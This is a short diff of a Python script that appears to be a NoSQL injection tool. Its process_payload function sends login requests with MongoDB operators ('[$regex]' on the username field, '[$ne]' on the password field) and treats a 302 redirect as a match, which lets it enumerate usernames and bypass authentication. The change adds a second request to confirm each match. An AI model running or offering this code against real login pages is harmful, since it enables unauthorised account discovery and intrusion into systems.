@@ -44,10 +44,21 @@ def process_payload(payload, characters, url, method, enum_parameter, password_p
         r.raise_for_status()
 
         if r.status_code == 302:
-            return payload  # Only return the payload if a match is found
+            # Check if the payload is a valid username
+            para = {enum_parameter + '[$regex]': "^" + payload + ".*", password_parameter + '[$ne]': '1' + other_parameters}
+            try:
+                r = session.request(method=method, url=url, data=para, allow_redirects=False, timeout=10)
+                r.raise_for_status()
+
+                if r.status_code == 302:
+                    return payload  # Only return the payload if a match is found
+
+            except requests.exceptions.RequestException as e:
+                print(Fore.RED + "Error occurred during request:", e)
 
     except requests.exceptions.RequestException as e:
         print(Fore.RED + "Error occurred during request:", e)
+
 
 def main():
     args = get_arguments()
